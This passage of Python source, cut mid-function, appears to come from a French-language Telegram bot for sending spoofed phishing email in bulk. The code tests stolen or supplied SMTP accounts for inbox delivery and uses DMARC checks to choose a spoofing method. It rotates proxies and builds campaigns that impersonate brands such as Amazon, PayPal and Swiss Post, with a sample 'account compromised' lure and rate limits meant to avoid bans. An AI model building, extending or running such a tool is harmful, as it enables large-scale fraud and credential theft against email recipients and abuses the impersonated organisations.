                                    found[m] = label
                except Exception as e:
                    print(f"[MASS IMAP] Gmail {folder_name} scan error: {e}", flush=True)
                return found

            # SPAM first (higher priority)
            spam_found = _scan_folder("[Gmail]/Spam", "spam")
            results.update(spam_found)
            # INBOX for remaining
            inbox_found = _scan_folder("INBOX", "inbox")
            for m, v in inbox_found.items():
                if m not in results:
                    results[m] = v
            # Fallback: individual search for any still missing (small batch)
            still_missing = [m for m in markers_to_check if m not in results]
            if still_missing and len(still_missing) <= 50:
                for folder, label in [("[Gmail]/Spam", "spam"), ("INBOX", "inbox")]:
                    try:
                        st, _ = imap.select(folder, readonly=True)
                        if st != "OK":
                            continue
                        for m in [x for x in still_missing if x not in results]:
                            st2, ids = imap.search(None, f'SUBJECT "{m}"')
                            if st2 == "OK" and ids[0] and ids[0].strip():
                                results[m] = label
                    except Exception:
                        break
            imap.logout()
            print(f"[MASS IMAP] Gmail bulk: {len(results)}/{len(markers_to_check)} found", flush=True)
        except Exception as e:
            print(f"[MASS IMAP] Gmail error: {e}", flush=True)
        return results

    gmail_results = await asyncio.to_thread(_batch_gmail, gmail_markers) if gmail_markers else {}

    # --- Outlook batch check ---
    outlook_markers = list(stats["markers_spoof_outlook"].keys()) + list(stats["markers_basique_outlook"].keys())
    outlook_results = {}
    if outlook_markers and has_outlook:
        outlook_results = await asyncio.to_thread(batch_outlook_imap, outlook_markers)

    # Retry missing after 30s
    gmail_missing = [m for m in gmail_markers if m not in gmail_results]
    outlook_missing = [m for m in outlook_markers if m not in outlook_results]
    if gmail_missing or outlook_missing:
        await _send(f"Retry: Gmail {len(gmail_missing)} / Outlook {len(outlook_missing)} manquants...")
        await asyncio.sleep(30)
        if gmail_missing:
            r2 = await asyncio.to_thread(_batch_gmail, gmail_missing)
            gmail_results.update(r2)
        if outlook_missing and has_outlook:
            r2 = await asyncio.to_thread(batch_outlook_imap, outlook_missing)
            outlook_results.update(r2)

    # === DOUBLE-CHECK INBOX markers in SPAM after 45s ===
    gmail_inbox = [m for m, v in gmail_results.items() if v == "inbox"]
    outlook_inbox = [m for m, v in outlook_results.items() if v == "inbox"]
    if gmail_inbox or outlook_inbox:
        await _send(f"DOUBLE-CHECK: Gmail {len(gmail_inbox)} + Outlook {len(outlook_inbox)} INBOX...")
        await asyncio.sleep(45)
        if gmail_inbox:
            recheck = await asyncio.to_thread(_batch_gmail, gmail_inbox)
            # Only reclassify if now found in spam
            for m in gmail_inbox:
                if m in recheck and recheck[m] == "spam":
                    gmail_results[m] = "spam"
        if outlook_inbox and has_outlook:
            def _recheck_outlook_spam(markers):
                results = {}
                try:
                    from .imap_checker import _connect_outlook_imap, OUTLOOK_CHECKER
                    imap = _connect_outlook_imap(timeout=30)
                    st, _ = imap.select(OUTLOOK_CHECKER["spam_folder"], readonly=True)
                    if st == "OK":
                        for m in markers:
                            st2, ids = imap.search(None, f'SUBJECT "{m}"')
                            if st2 == "OK" and ids[0] and ids[0].strip():
                                results[m] = "spam"
                    imap.logout()
                except Exception:
                    pass
                return results
            recheck_otl = await asyncio.to_thread(_recheck_outlook_spam, outlook_inbox)
            for m in outlook_inbox:
                if m in recheck_otl and recheck_otl[m] == "spam":
                    outlook_results[m] = "spam"

    # === CLASSIFY per provider ===
    smtp_results = {}  # key -> {smtp, gmail_spoof, gmail_basique, outlook_spoof, outlook_basique}

    def _key(s):
        return f"{s['host']}:{s['port']}|{s['user']}"

    for marker, s in stats["markers_spoof_gmail"].items():
        k = _key(s)
        if k not in smtp_results:
            smtp_results[k] = {"smtp": s, "gmail_spoof": "nf", "gmail_basique": "nf", "outlook_spoof": "nf", "outlook_basique": "nf"}
        smtp_results[k]["gmail_spoof"] = gmail_results.get(marker, "nf")

    for marker, s in stats["markers_basique_gmail"].items():
        k = _key(s)
        if k not in smtp_results:
            smtp_results[k] = {"smtp": s, "gmail_spoof": "nf", "gmail_basique": "nf", "outlook_spoof": "nf", "outlook_basique": "nf"}
        smtp_results[k]["gmail_basique"] = gmail_results.get(marker, "nf")

    for marker, s in stats["markers_spoof_outlook"].items():
        k = _key(s)
        if k not in smtp_results:
            smtp_results[k] = {"smtp": s, "gmail_spoof": "nf", "gmail_basique": "nf", "outlook_spoof": "nf", "outlook_basique": "nf"}
        smtp_results[k]["outlook_spoof"] = outlook_results.get(marker, "nf")

    for marker, s in stats["markers_basique_outlook"].items():
        k = _key(s)
        if k not in smtp_results:
            smtp_results[k] = {"smtp": s, "gmail_spoof": "nf", "gmail_basique": "nf", "outlook_spoof": "nf", "outlook_basique": "nf"}
        smtp_results[k]["outlook_basique"] = outlook_results.get(marker, "nf")

    # Build classification label per SMTP
    # Format: SPOOF_INBOX_GMAIL, SPOOF_INBOX_OUTLOOK, SPOOF_INBOX_BOTH, etc.
    categories = {
        "SPOOF_INBOX_GMAIL": [], "SPOOF_INBOX_OUTLOOK": [], "SPOOF_INBOX_BOTH": [],
        "SPOOF_SPAM_GMAIL": [], "SPOOF_SPAM_OUTLOOK": [],
        "BASIQUE_INBOX_GMAIL": [], "BASIQUE_INBOX_OUTLOOK": [], "BASIQUE_INBOX_BOTH": [],
        "BASIQUE_SPAM_GMAIL": [], "BASIQUE_SPAM_OUTLOOK": [],
        "DEAD": [],
    }

    for key, info in smtp_results.items():
        s = info["smtp"]
        gs = info["gmail_spoof"]
        gb = info["gmail_basique"]
        os_r = info["outlook_spoof"]
        ob = info["outlook_basique"]

        # Determine best category
        gmail_inbox_spoof = gs == "inbox"
        gmail_inbox_basique = gb == "inbox"
        outlook_inbox_spoof = os_r == "inbox"
        outlook_inbox_basique = ob == "inbox"
        gmail_spam_spoof = gs == "spam"
        outlook_spam_spoof = os_r == "spam"

        label_parts = []

        # SPOOF classification
        if gmail_inbox_spoof and outlook_inbox_spoof:
            categories["SPOOF_INBOX_BOTH"].append(s)
            label_parts.append("SPOOF_INBOX_BOTH")
        elif gmail_inbox_spoof:
            categories["SPOOF_INBOX_GMAIL"].append(s)
            label_parts.append("SPOOF_INBOX_GMAIL")
        elif outlook_inbox_spoof:
            categories["SPOOF_INBOX_OUTLOOK"].append(s)
            label_parts.append("SPOOF_INBOX_OUTLOOK")
        elif gmail_spam_spoof:
            categories["SPOOF_SPAM_GMAIL"].append(s)
            label_parts.append("SPOOF_SPAM_GMAIL")
        elif outlook_spam_spoof:
            categories["SPOOF_SPAM_OUTLOOK"].append(s)
            label_parts.append("SPOOF_SPAM_OUTLOOK")
        # BASIQUE fallback
        elif gmail_inbox_basique and outlook_inbox_basique:
            categories["BASIQUE_INBOX_BOTH"].append(s)
            label_parts.append("BASIQUE_INBOX_BOTH")
        elif gmail_inbox_basique:
            categories["BASIQUE_INBOX_GMAIL"].append(s)
            label_parts.append("BASIQUE_INBOX_GMAIL")
        elif outlook_inbox_basique:
            categories["BASIQUE_INBOX_OUTLOOK"].append(s)
            label_parts.append("BASIQUE_INBOX_OUTLOOK")
        elif gb == "spam":
            categories["BASIQUE_SPAM_GMAIL"].append(s)
            label_parts.append("BASIQUE_SPAM_GMAIL")
        elif ob == "spam":
            categories["BASIQUE_SPAM_OUTLOOK"].append(s)
            label_parts.append("BASIQUE_SPAM_OUTLOOK")
        else:
            categories["DEAD"].append(s)
            continue

        # Save to DB with provider-specific label
        best_label = label_parts[0] if label_parts else "AUTRE"
        _add_manual_smtp({**s, "label": f"{best_label}_{s['label']}"})

    elapsed = time.time() - start_time

    # Build report
    report = [
        "=" * 40,
        "  MASS IMAP CHECK — DUAL (Gmail+Outlook)",
        "=" * 40,
        "",
        f"Template: {tpl['brand']}",
        f"Gmail checker: {checker_email}",
        f"Outlook checker: {outlook_email or 'N/A'}",
        f"Total: {total} | Temps: {elapsed:.0f}s",
        "",
        "--- RESULTATS ---",
    ]

    for cat_name in ["SPOOF_INBOX_BOTH", "SPOOF_INBOX_GMAIL", "SPOOF_INBOX_OUTLOOK",
                      "SPOOF_SPAM_GMAIL", "SPOOF_SPAM_OUTLOOK",
                      "BASIQUE_INBOX_BOTH", "BASIQUE_INBOX_GMAIL", "BASIQUE_INBOX_OUTLOOK",
                      "BASIQUE_SPAM_GMAIL", "BASIQUE_SPAM_OUTLOOK", "DEAD"]:
        items = categories[cat_name]
        if items:
            report.append(f"\n=== {cat_name} ({len(items)}) ===")
            for s in items[:10]:
                report.append(f"  {s['label']} | {s['host']}:{s['port']} | {s['user']}")
            if len(items) > 10:
                report.append(f"  ... +{len(items) - 10}")

    report.append(f"\nAUTH FAIL: {stats['auth_fail']}")

    total_good = sum(len(v) for k, v in categories.items() if k != "DEAD")
    if total_good:
        report.append(f"\n{total_good} SMTP ajoutes a MES SMTP!")
    else:
        report.append("\nAUCUN SMTP LIVRE.")

    final_text = "\n".join(report)
    if len(final_text) > 4000:
        final_text = final_text[:4000] + "\n..."
    await _send(final_text)
    print(f"[MASS IMAP] DONE — {total} SMTP, {elapsed:.0f}s", flush=True)




# ---------------------------------------------------------------------------
# Messages (text input for campaign/spoof flow)
# ---------------------------------------------------------------------------
async def messages(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _allowed(update):
        return
    text = (update.effective_message.text or "").strip()
    if not text:
        return
    
    waiting = ctx.user_data.get("waiting")
    print(f"[MSG] waiting={waiting} text={text[:50]}")
    
    if text == "/cancel":
        ctx.user_data.pop("waiting", None)
        ctx.user_data.pop("camp_data", None)
        ctx.user_data.pop("spoof_smtp_id", None)
        return await update.effective_message.reply_text("Annule.", reply_markup=_kb_main())
    
    waiting = ctx.user_data.get("waiting")

    # ===== MASS SPOOF TEST FLOW =====
    if waiting == "mass_test_email":
        if not EMAIL_RE.match(text):
            return await update.effective_message.reply_text("Email invalide. Reessaie.")
        ctx.user_data["mass_test_to"] = text
        ctx.user_data["waiting"] = "mass_test_tpl"
        from .spoof_templates import SPOOF_TEMPLATES
        buttons = []
        for key, tpl in SPOOF_TEMPLATES.items():
            buttons.append([InlineKeyboardButton(
                f"{tpl['brand']}", callback_data=f"mass_tpl_{key}"
            )])
        return await update.effective_message.reply_text(
            f"Destinataire: {text}\n\n"
            "Etape 2/3: Choisis le TEMPLATE de spoof:",
            reply_markup=InlineKeyboardMarkup(buttons),
        )

    if waiting == "mass_test_file":
        # User pasted SMTP lines directly (not file)
        await _run_mass_test(update, ctx, text)
        return

    # ===== MASS IMAP CHECK FLOW =====
    if waiting == "mass_imap_file":
        await _run_mass_imap_check(update, ctx, text)
        return
    
    # ===== ADD SMTP MANUAL FLOW =====
    if waiting == "add_smtp_lines":
        lines = text.strip().splitlines()
        added = 0
        failed = 0
        results = []
        for line in lines:
            line = line.strip()
            if not line:
                continue
            parsed = _parse_smtp_line(line)
            if parsed:
                cred_id = _add_manual_smtp(parsed)
                added += 1
                results.append(f"  OK #{cred_id} {parsed['label']} ({parsed['host']}:{parsed['port']})")
            else:
                failed += 1
                results.append(f"  FAIL: {line[:50]}")
        
        ctx.user_data.pop("waiting", None)
        
        summary = "\n".join(results[:20])
        return await update.effective_message.reply_text(
            f"ADD SMTP RESULT\n\n"
            f"Ajoutes: {added}\n"
            f"Echecs: {failed}\n\n"
            f"{summary}\n\n"
            f"{'Les SMTP sont prets a utiliser.' if added > 0 else 'Verifie le format: host:port|user:pass|LABEL'}",
            reply_markup=_kb_main(),
        )

    # ===== ADD PROXY FLOW =====
    if waiting == "add_proxy_lines":
        from .proxy_pool import ProxyPool
        pool = ProxyPool(DB_PATH)
        lines = text.strip().splitlines()
        added = 0
        failed = 0
        results = []
        for line in lines:
            line = line.strip()
            if not line:
                continue
            # Extract optional label: "socks5://host:port LABEL" or just the URL
            parts = line.rsplit(" ", 1)
            url = parts[0].strip()
            label = parts[1].strip() if len(parts) > 1 else ""
            pid = pool.add_proxy(url, label=label)
            if pid:
                added += 1
                results.append(f"  OK #{pid} {url[:40]}")
            else:
                failed += 1
                results.append(f"  FAIL: {line[:50]} (format invalide ou doublon)")
        pool.close()
        ctx.user_data.pop("waiting", None)

        summary = "\n".join(results[:20])
        return await update.effective_message.reply_text(
            f"ADD PROXY RESULT\n\n"
            f"Ajoutes: {added}\n"
            f"Echecs: {failed}\n\n"
            f"{summary}\n\n"
            f"{'Les proxies sont actifs — rotation auto dans les envois.' if added > 0 else 'Verifie le format.'}",
            reply_markup=_kb_main(),
        )


    # ===== CAMPAGNE SWISS POST FLOW =====
    if waiting == "csp_rate":
        try:
            rate = int(text.strip())
            if rate < 1: rate = 1
            if rate > 500: rate = 500
        except ValueError:
            return await update.effective_message.reply_text("Nombre invalide. Reessaie (ex: 30).")
        ctx.user_data["csp_rate"] = rate
        ctx.user_data["waiting"] = "csp_recipients"
        return await update.effective_message.reply_text(
            "CAMPAGNE SWISS POST\n\n"
            "Rate: " + str(rate) + "/min\n\n"
            "Etape 2/2: Envoie la LISTE DE DESTINATAIRES\n"
            "(un email par ligne, ou fichier .txt)\n\n"
            "/cancel pour annuler"
        )

    if waiting == "csp_recipients":
        # Split by newlines, spaces, commas, semicolons
        raw_parts = re.split(r"[\n\r\s,;]+", text.strip())
        emails = [e.strip().lower() for e in raw_parts if "@" in e.strip() and "." in e.strip()]
        if not emails:
            return await update.effective_message.reply_text("Aucun email valide. Reessaie.")
        mode = ctx.user_data.get("csp_mode", "spoof")
        rate = ctx.user_data.get("csp_rate", 30)
        ctx.user_data.pop("waiting", None)
        ctx.user_data.pop("csp_mode", None)
        ctx.user_data.pop("csp_rate", None)

        from .spoof_templates import get_template
        tpl = get_template("swisspost")
        if not tpl:
            return await update.effective_message.reply_text("Template introuvable.", reply_markup=_kb_main())

        from .campaign_sender import CampaignManager, SmtpAccount
        mgr = CampaignManager(DB_PATH)
        camp_name = "Swiss Post " + ({"spoof": "SPOOF", "both": "SPOOF+BAS", "inbox": "INBOX ONLY"}.get(mode, mode.upper()))
        camp_id = mgr.create_campaign(
            name=camp_name, subject=tpl["subject"], letter_html=tpl["html"],
            from_name=tpl["from_name"], from_email=tpl["from_email"],
            reply_to=tpl.get("reply_to", ""), rate_per_minute=rate,
        )
        added_recip = mgr.add_recipients(camp_id, emails)

        smtp_list = _get_all_smtp()
        smtp_added = 0
        for s in smtp_list:
            cat = _classify_smtp(s)
            if mode == "spoof" and cat not in ("SPOOF", "AUTRE"):
                continue
            smtp_obj = SmtpAccount(
                cred_id=s["id"], host=s["smtp_host"], port=s["smtp_port"] or 587,
                username=s["smtp_user"] or "", password=s["smtp_password"] or "",
                from_email=s.get("smtp_user", ""), provider=s.get("provider", ""),
            )
            mgr.add_smtp(camp_id, smtp_obj)
            smtp_added += 1
        stats = mgr.get_stats(camp_id)
        mgr.close()

        if smtp_added == 0:
            return await update.effective_message.reply_text("Aucun SMTP pour ce mode.", reply_markup=_kb_main())

        mode_label = "SPOOF ONLY" if mode == "spoof" else "SPOOF + BASIQUE"
        await update.effective_message.reply_text(
            "CAMPAGNE SWISS POST #" + str(camp_id) + " CREEE\n\n"
            "Mode: " + mode_label + "\n"
            "From: " + tpl["from_name"] + " <" + tpl["from_email"] + ">\n"
            "Destinataires: " + str(added_recip) + "\n"
            "SMTP: " + str(smtp_added) + "\n"
            "Rate: " + str(rate) + "/min\n\n"
            "LANCEMENT...",
            reply_markup=_kb_main(),
        )
        chat_id = update.effective_message.chat_id
        asyncio.create_task(_run_swisspost_campaign(camp_id, DB_PATH, chat_id, mode))
        return


    # ===== TEMPLATE SEND FLOW =====
    if waiting == "tpl_send_to":
        if not EMAIL_RE.match(text):
            return await update.effective_message.reply_text("Email invalide. Reessaie.")
        tpl_data = ctx.user_data.get("tpl_data", {})
        tpl_key = tpl_data.get("tpl_key", "")
        smtp_id = tpl_data.get("smtp_id")
        ctx.user_data.pop("waiting", None)
        ctx.user_data.pop("tpl_data", None)

        from .spoof_templates import get_template
        tpl = get_template(tpl_key)
        smtp = _get_smtp_by_id(smtp_id)
        if not tpl or not smtp:
            return await update.effective_message.reply_text("Template/SMTP introuvable.", reply_markup=_kb_main())

        # DMARC pre-check — auto-select best spoof mode
        from .campaign_sender import pick_best_spoof_mode
        try:
            best_mode, dmarc_info = await asyncio.to_thread(pick_best_spoof_mode, tpl["from_email"])
        except Exception:
            best_mode, dmarc_info = "clean", {"policy": "unknown"}
        dmarc_policy = dmarc_info.get("policy", "?")
        dmarc_domain = tpl["from_email"].split("@")[1] if "@" in tpl["from_email"] else "?"

        try:
            await update.effective_message.reply_text(
                f"ENVOI EN COURS...\n"
                f"Template: {tpl['brand']}\n"
                f"From: {tpl['from_name']} <{tpl['from_email']}>\n"
                f"To: {text}"
            )
        except Exception:
            pass  # Don't crash if Telegram API is slow

        _tpl_smtp_config = {
                "host": smtp["smtp_host"],
                "port": smtp["smtp_port"],
                "username": smtp["smtp_user"],
                "password": smtp["smtp_password"],
                "from_email": smtp.get("smtp_user", ""),
            }

        # Launch in background to avoid Telegram timeout
        bot = update.get_bot()
        chat_id = update.effective_message.chat_id
        asyncio.create_task(
            _bg_tpl_spoof_test(bot, chat_id, _tpl_smtp_config, tpl, text,
                               best_mode, dmarc_domain, dmarc_policy)
        )
        return
    
    # ===== SPOOF TEST FLOW =====
    if waiting == "spoof_to":
        if not EMAIL_RE.match(text):
            return await update.effective_message.reply_text("Email invalide. Reessaie.")
        ctx.user_data["spoof_to"] = text
        ctx.user_data["waiting"] = "spoof_from"
        return await update.effective_message.reply_text(
            f"Destinataire: {text}\n\n"
            "Etape 2/3: Envoie le FROM SPOOFE\n"
            "Format: NomExpediteur|email@domain.com\n"
            "Exemple: Amazon|noreply@amazon.com\n"
            "Exemple: PayPal Security|security@paypal.com\n"
            "/cancel pour annuler"
        )
    
    if waiting == "spoof_from":
        parts = text.split("|", 1)
        from_name = parts[0].strip()
        from_email = parts[1].strip() if len(parts) > 1 else ""
        ctx.user_data["spoof_from_name"] = from_name
        ctx.user_data["spoof_from_email"] = from_email
        ctx.user_data["waiting"] = "spoof_subject"
        return await update.effective_message.reply_text(
            f"From: {from_name} <{from_email}>\n\n"
            "Etape 3/3: Envoie le SUJET + CONTENU\n"
            "Premiere ligne = sujet\n"
            "Le reste = corps du mail (HTML ou texte)\n\n"
            "Exemple:\n"
            "Votre compte a ete compromis\n"
            "<h1>Action requise</h1><p>Cliquez ici...</p>\n"
            "/cancel pour annuler"
        )
    
    if waiting == "spoof_subject":
        lines = text.split("\n", 1)
        subject = lines[0].strip()
        body = lines[1].strip() if len(lines) > 1 else subject
        
        cred_id = ctx.user_data.get("spoof_smtp_id")
        smtp = _get_smtp_by_id(cred_id)
        to_email = ctx.user_data.get("spoof_to", "")
        from_name = ctx.user_data.get("spoof_from_name", "")
        from_email = ctx.user_data.get("spoof_from_email", "")
        
        ctx.user_data.pop("waiting", None)
        
        if not smtp:
            return await update.effective_message.reply_text("SMTP introuvable.", reply_markup=_kb_main())
        
        # DMARC pre-check
        from .campaign_sender import pick_best_spoof_mode
        try:
            best_mode, dmarc_info = await asyncio.to_thread(pick_best_spoof_mode, from_email)
        except Exception:
            best_mode, dmarc_info = "clean", {"policy": "unknown"}
        dmarc_policy = dmarc_info.get("policy", "?")
        dmarc_domain = from_email.split("@")[1] if "@" in from_email else "?"

        try:
            await update.effective_message.reply_text(
                f"ENVOI EN COURS...\n"
                f"SMTP: {(smtp.get('provider') or '?').upper()} #{cred_id}\n"
                f"From: {from_name} <{from_email}>\n"
                f"To: {to_email}\n"
                f"Sujet: {subject}"
            )
        except Exception:
            pass  # Don't crash if Telegram API is slow
        
        # Send spoofed email with auto-selected mode
        # send_clean is used in _bg_spoof_test

        smtp_config = {
                "host": smtp["smtp_host"],
                "port": smtp["smtp_port"],
                "username": smtp["smtp_user"],
                "password": smtp["smtp_password"],
                "from_email": smtp.get("smtp_user", ""),
            }
        html_body = body if "<" in body else f"<p>{body}</p>"
        text_body = body if "<" not in body else ""

        # Launch spoof test in background to avoid Telegram timeout
        bot = update.get_bot()
        chat_id = update.effective_message.chat_id
        asyncio.create_task(
            _bg_spoof_test(bot, chat_id, smtp_config, from_name, from_email,
                           to_email, subject, html_body, text_body, best_mode,
                           dmarc_domain, dmarc_policy, cred_id)
        )
        return
    
    # ===== CAMPAIGN CREATION FLOW =====
    if waiting == "camp_subject":
        ctx.user_data["camp_data"]["subject"] = text
        ctx.user_data["waiting"] = "camp_from"
        return await update.effective_message.reply_text(
            f"Sujet: {text}\n\n"
            "Etape 2/6: FROM SPOOFE\n"
            "Format: NomExpediteur|email@domain.com\n"
            "Exemple: Amazon|noreply@amazon.com\n"
            "/cancel pour annuler"
        )
    
    if waiting == "camp_from":
        parts = text.split("|", 1)
        ctx.user_data["camp_data"]["from_name"] = parts[0].strip()
        ctx.user_data["camp_data"]["from_email"] = parts[1].strip() if len(parts) > 1 else ""
        ctx.user_data["waiting"] = "camp_reply_to"
        return await update.effective_message.reply_text(
            f"From: {parts[0].strip()} <{parts[1].strip() if len(parts) > 1 else ''}>\n\n"
            "Etape 3/6: REPLY-TO (optionnel)\n"
            "Envoie l'adresse de reponse, ou 'skip'\n"
            "/cancel pour annuler"
        )
    
    if waiting == "camp_reply_to":
        if text.lower() != "skip" and "@" in text:
            ctx.user_data["camp_data"]["reply_to"] = text.strip()
        ctx.user_data["waiting"] = "camp_letter"
        return await update.effective_message.reply_text(
            "Etape 4/6: LETTRE HTML\n"
            "Colle ton code HTML ou envoie un fichier .html\n"
            "/cancel pour annuler"
        )
    
    if waiting == "camp_letter":
        ctx.user_data["camp_data"]["letter_html"] = text
        ctx.user_data["waiting"] = "camp_rate"
        return await update.effective_message.reply_text(
            "Etape 5/6: RATE (mails/minute)\n"
            "Envoie un nombre (ex: 30, 60, 100)\n"
            "Recommande: 30 pour eviter les bans\n"
            "/cancel pour annuler"
        )
    
    if waiting == "camp_rate":
        try:
            rate = int(text)
            rate = max(1, min(500, rate))
        except ValueError:
            rate = 30
        ctx.user_data["camp_data"]["rate"] = rate
        ctx.user_data["waiting"] = "camp_recipients"
        return await update.effective_message.reply_text(
            f"Rate: {rate}/min\n\n"
            "Etape 6/6: LISTE DESTINATAIRES\n"
            "1 email par ligne ou envoie un fichier .txt\n"
            "/cancel pour annuler"
        )
    
    if waiting == "camp_recipients":
        raw_parts = re.split(r"[\n\r\s,;]+", text.strip())
        emails = [e.strip().lower() for e in raw_parts if "@" in e.strip() and "." in e.strip()]
        if not emails:
            return await update.effective_message.reply_text("Aucun email. 1 par ligne.")
        
        camp_data = ctx.user_data.get("camp_data", {})
        mgr = CampaignManager(DB_PATH)
        camp_id = mgr.create_campaign(
            name=camp_data.get("subject", "Campaign")[:30],
            subject=camp_data.get("subject", ""),
            from_name=camp_data.get("from_name", ""),
            from_email=camp_data.get("from_email", ""),
            reply_to=camp_data.get("reply_to", ""),
            letter_html=camp_data.get("letter_html", ""),
            rate_per_minute=camp_data.get("rate", 30),
        )
        added = mgr.add_recipients(camp_id, emails)
        
        # Add specific SMTP or all
        smtp_id = camp_data.get("smtp_id")
        if smtp_id == "all":
            smtp_count = mgr.add_all_valid_smtp(camp_id)
        elif smtp_id:
            smtp = _get_smtp_by_id(int(smtp_id))
            if smtp:
                mgr.add_smtp(camp_id, SmtpAccount(
                    cred_id=int(smtp_id),
                    host=smtp["smtp_host"],
                    port=smtp["smtp_port"] or 587,
                    username=smtp["smtp_user"] or "",
                    password=smtp["smtp_password"] or "",
                    from_email=camp_data.get("from_email", ""),
                    provider=smtp.get("provider", ""),
                ))
                smtp_count = 1
            else:
                smtp_count = 0
        else:
            smtp_count = mgr.add_all_valid_smtp(camp_id)
        
        mgr.close()
        ctx.user_data.pop("waiting", None)
        ctx.user_data.pop("camp_data", None)
        
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("LANCER MAINTENANT", callback_data=f"camp_start_{camp_id}")],
            [InlineKeyboardButton("VOIR DETAILS", callback_data=f"camp_view_{camp_id}")],
            [InlineKeyboardButton("Menu", callback_data="back_main")],
        ])
        
        return await update.effective_message.reply_text(
            f"=============================\n"
            f"  CAMPAGNE #{camp_id} CREEE\n"
            f"=============================\n\n"
            f"Sujet: {camp_data.get('subject', '?')}\n"
            f"From: {camp_data.get('from_name', '?')} <{camp_data.get('from_email', '?')}>\n"
            f"Reply-To: {camp_data.get('reply_to', 'aucun')}\n"
            f"Rate: {camp_data.get('rate', 30)}/min\n"
            f"Destinataires: {added}\n"
            f"SMTP: {smtp_count}\n\n"
            f"Le FROM est SPOOFE\n"
            f"Le destinataire voit: {camp_data.get('from_email', '?')}",
            reply_markup=kb,
        )


# ---------------------------------------------------------------------------
# File upload (recipients list or HTML letter)
# ---------------------------------------------------------------------------
async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _allowed(update):
        return
    doc = update.effective_message.document
    if not doc:
        return
    try:
        file = await doc.get_file()
        data = await file.download_as_bytearray()
        text = data.decode("utf-8", "ignore")
    except Exception as e:
        return await update.effective_message.reply_text(f"Erreur: {e}")
    
    waiting = ctx.user_data.get("waiting")
    fname = doc.file_name or "?"
    print(f"[DOC] waiting={waiting} file={fname} size={doc.file_size}")

    # --- MASS SPOOF TEST from file ---
    if waiting == "mass_test_file":
        print(f"[MASS TEST] Starting with file {fname}")
        await _run_mass_test(update, ctx, text)
        return

    # --- MASS IMAP CHECK from file ---
    if waiting == "mass_imap_file":
        print(f"[MASS IMAP] Starting with file {fname}")
        await _run_mass_imap_check(update, ctx, text)
        return
    
    # --- ADD SMTP from file ---
    if waiting == "add_smtp_lines":
        lines = text.strip().splitlines()
        added = 0
        failed = 0
        results = []
        for line in lines:
            line = line.strip()
            if not line:
                continue
            parsed = _parse_smtp_line(line)
            if parsed:
                cred_id = _add_manual_smtp(parsed)
                added += 1
                results.append(f"  OK #{cred_id} {parsed['label']} ({parsed['host']}:{parsed['port']})")
            else:
                failed += 1
        
        ctx.user_data.pop("waiting", None)
        return await update.effective_message.reply_text(
            f"ADD SMTP (fichier)\n\n"
            f"Ajoutes: {added}\n"
            f"Echecs: {failed}\n\n"
            f"{chr(10).join(results[:15])}",
            reply_markup=_kb_main(),
        )

    # --- ADD PROXY from file ---
    if waiting == "add_proxy_lines":
        from .proxy_pool import ProxyPool
        pool = ProxyPool(DB_PATH)
        lines = text.strip().splitlines()
        added = 0
        failed = 0
        for line in lines:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.rsplit(" ", 1)
            url = parts[0].strip()
            label = parts[1].strip() if len(parts) > 1 else ""
            pid = pool.add_proxy(url, label=label)
            if pid:
                added += 1
            else:
                failed += 1
        pool.close()
        ctx.user_data.pop("waiting", None)
        return await update.effective_message.reply_text(
            f"ADD PROXY (fichier)\n\n"
            f"Ajoutes: {added}\n"
            f"Echecs: {failed}",
            reply_markup=_kb_main(),
        )
    
    # --- CAMPAGNE SWISS POST recipients from file ---
    if waiting == "csp_recipients":
        raw_parts = re.split(r"[\n\r\s,;]+", text.strip())
        emails = [e.strip().lower() for e in raw_parts if "@" in e.strip() and "." in e.strip()]
        if not emails:
            return await update.effective_message.reply_text("Aucun email valide dans le fichier. Reessaie.")
        mode = ctx.user_data.get("csp_mode", "spoof")
        rate = ctx.user_data.get("csp_rate", 30)
        ctx.user_data.pop("waiting", None)
        ctx.user_data.pop("csp_mode", None)
        ctx.user_data.pop("csp_rate", None)

        from .spoof_templates import get_template
        tpl = get_template("swisspost")
        if not tpl:
            return await update.effective_message.reply_text("Template introuvable.", reply_markup=_kb_main())

        from .campaign_sender import CampaignManager, SmtpAccount
        mgr = CampaignManager(DB_PATH)
        camp_name = "Swiss Post " + ({"spoof": "SPOOF", "both": "SPOOF+BAS", "inbox": "INBOX ONLY"}.get(mode, mode.upper()))
        camp_id = mgr.create_campaign(
            name=camp_name, subject=tpl["subject"], letter_html=tpl["html"],
            from_name=tpl["from_name"], from_email=tpl["from_email"],
            reply_to=tpl.get("reply_to", ""), rate_per_minute=rate,
        )
        added_recip = mgr.add_recipients(camp_id, emails)

        smtp_list = _get_all_smtp()
        smtp_added = 0
        for s in smtp_list:
            cat = _classify_smtp(s)
            if mode == "spoof" and cat not in ("SPOOF", "AUTRE"):
                continue
            smtp_obj = SmtpAccount(
                cred_id=s["id"], host=s["smtp_host"], port=s["smtp_port"] or 587,
                username=s["smtp_user"] or "", password=s["smtp_password"] or "",
                from_email=s.get("smtp_user", ""), provider=s.get("provider", ""),
            )
            mgr.add_smtp(camp_id, smtp_obj)
            smtp_added += 1
        stats = mgr.get_stats(camp_id)
        mgr.close()

        if smtp_added == 0:
            return await update.effective_message.reply_text("Aucun SMTP pour ce mode.", reply_markup=_kb_main())

        mode_label = {"spoof": "SPOOF ONLY", "both": "SPOOF + BASIQUE", "inbox": "INBOX ONLY"}.get(mode, mode.upper())
        await update.effective_message.reply_text(
            "CAMPAGNE SWISS POST #" + str(camp_id) + " CREEE\n\n"
            "Mode: " + mode_label + "\n"
            "From: " + tpl["from_name"] + " <" + tpl["from_email"] + ">\n"
            "Destinataires: " + str(added_recip) + "\n"
            "SMTP: " + str(smtp_added) + "\n"
            "Rate: " + str(rate) + "/min\n\n"
            "LANCEMENT...",
            reply_markup=_kb_main(),
        )
        chat_id = update.effective_message.chat_id
        asyncio.create_task(_run_swisspost_campaign(camp_id, DB_PATH, chat_id, mode))
        return

    if waiting == "camp_letter":
        ctx.user_data["camp_data"]["letter_html"] = text
        ctx.user_data["waiting"] = "camp_rate"
        return await update.effective_message.reply_text(
            f"Lettre HTML chargee ({len(text)} chars)\n\n"
            "Etape 5/6: RATE (mails/minute)\n"
            "Envoie un nombre (ex: 30)\n"
            "/cancel pour annuler"
        )
    
    if waiting == "camp_recipients":
        raw_parts = re.split(r"[\n\r\s,;]+", text.strip())
        emails = [e.strip().lower() for e in raw_parts if "@" in e.strip() and "." in e.strip()]
        if not emails:
            return await update.effective_message.reply_text("Aucun email valide dans le fichier.")

